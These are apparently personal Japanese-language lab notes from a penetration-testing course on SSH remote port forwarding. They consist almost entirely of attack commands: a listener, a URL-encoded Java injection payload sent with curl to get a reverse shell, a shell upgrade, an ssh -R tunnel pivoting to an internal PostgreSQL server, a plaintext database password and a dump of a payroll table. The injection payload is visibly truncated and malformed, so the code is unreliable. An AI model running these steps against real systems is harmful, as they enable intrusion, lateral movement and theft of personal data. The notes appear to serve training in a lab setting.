#  SSHリモートポート転送
![[Pasted image 20260508224025.png]]

## SSH Server
```bash
sudo systemctl start ssh

sudo ss -ntplu
```
![[Pasted image 20260508224035.png]]

ユーザー名とパスワードを使用して Kali SSH サーバーに接続するには、/etc/ssh/sshd_configで PasswordAuthentication をyesに設定して、パスワードベースの認証を明示的に許可する必要がある場合があります。

Kali
```bash
rlwrap -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngi%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%270%3E%261%27%29.start%28%29%22%29%7D/
```

## SSH Remote Port Forwarding

Victim
```bash
#Victim 
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:5432 kali@192.168.45.236
```

Kali
```
ss -ntplu
```
![[Pasted image 20260508224045.png]]
## Database Access
kali
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
D@t4basePassw0rd!

\l
```
![[Pasted image 20260508224055.png]]
## Lab1
```bash
\c hr_backup

select * from payroll;
```
![[Pasted image 20260508224102.png]]

## Lab2
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:4444 kali@192.168.45.236

chmod 777 2e345e06246bd4465204327a6d6892a5-ssh_remote_client

./2e345e06246bd4465204327a6d6892a5-ssh_remote_client -p 2345
```
![[Pasted image 20260508224111.png]]

